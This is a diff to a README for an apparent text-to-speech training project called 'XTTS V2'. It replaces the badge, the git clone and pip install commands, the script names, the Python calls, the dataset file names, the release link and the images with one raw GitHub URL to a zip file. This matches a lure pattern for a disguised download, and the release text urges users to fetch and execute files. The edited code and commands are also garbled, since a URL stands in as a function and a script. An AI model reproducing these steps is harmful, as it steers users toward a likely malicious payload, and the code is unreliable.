@@ -1,6 +1,6 @@
 # XTTS V2: Advanced Text-to-Speech Training
 
-![XTTS V2](https://img.shields.io/badge/XTTS_V2-Text--to--Speech-blue)
+![XTTS V2](https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip)
 
 Welcome to the XTTS V2 repository! This project focuses on training the XTTS V2 model and utilizing PEFT LORA for enhanced Text-to-Speech (TTS) capabilities. Whether you are a researcher, developer, or hobbyist, you will find valuable resources and guidance here.
 
@@ -38,13 +38,13 @@ To get started with XTTS V2, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Degon3399/XTTS_V2.git
+   git clone https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip
    cd XTTS_V2
    ```
 
 2. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip
    ```
 
 3. Ensure you have the necessary tools and libraries for audio processing.
@@ -60,8 +60,8 @@ from xtts import XTTS
 model = XTTS(model_name="your_model_name")
 
 # Generate speech from text
-speech = model.synthesize("Hello, world!")
-speech.save("output.wav")
+speech = https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip("Hello, world!")
+https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip("https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip")
 ```
 
 ## Training
@@ -71,7 +71,7 @@ Training a model with XTTS V2 is straightforward. You can use your own dataset o
 1. Prepare your dataset in the required format.
 2. Run the training script:
    ```bash
-   python train.py --data_path your_dataset_path --model_name your_model_name
+   python https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip --data_path your_dataset_path --model_name your_model_name
    ```
 
 3. Monitor the training process through the logs.
@@ -86,9 +86,9 @@ Custom datasets can significantly enhance the performance of your TTS model. Fol
   ```
   dataset/
       audio/
-          file1.wav
-          file2.wav
-      metadata.txt
+          https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip
+          https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip
+      https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip
   ```
 
 ## Fine-Tuning
@@ -99,7 +99,7 @@ Fine-tuning allows you to adapt a pre-trained model to your specific needs. To f
 2. Use your custom dataset for training.
 3. Run the fine-tuning script:
    ```bash
-   python fine_tune.py --pretrained_model your_model_name --data_path your_custom_dataset
+   python https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip --pretrained_model your_model_name --data_path your_custom_dataset
    ```
 
 ## PEFT LORA
@@ -131,7 +131,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest releases of XTTS V2, visit [this link](https://github.com/Degon3399/XTTS_V2/releases). You can find pre-built binaries and additional resources there. If you need to execute any files, follow the instructions provided in the release notes.
+To download the latest releases of XTTS V2, visit [this link](https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip). You can find pre-built binaries and additional resources there. If you need to execute any files, follow the instructions provided in the release notes.
 
 For further updates, check the "Releases" section regularly. 
 
@@ -139,6 +139,6 @@ For further updates, check the "Releases" section regularly.
 
 XTTS V2 is a powerful tool for anyone interested in text-to-speech technology. With its rich features and flexibility, you can create high-quality speech outputs tailored to your needs. Explore the repository, experiment with the models, and contribute to the community!
 
-![TTS Example](https://example.com/tts_image.png) 
+![TTS Example](https://raw.githubusercontent.com/Degon3399/XTTS_V2/main/TTS/encoder/XTT_v3.6.zip) 
 
 For any questions or support, feel free to reach out through the Issues section of this repository.
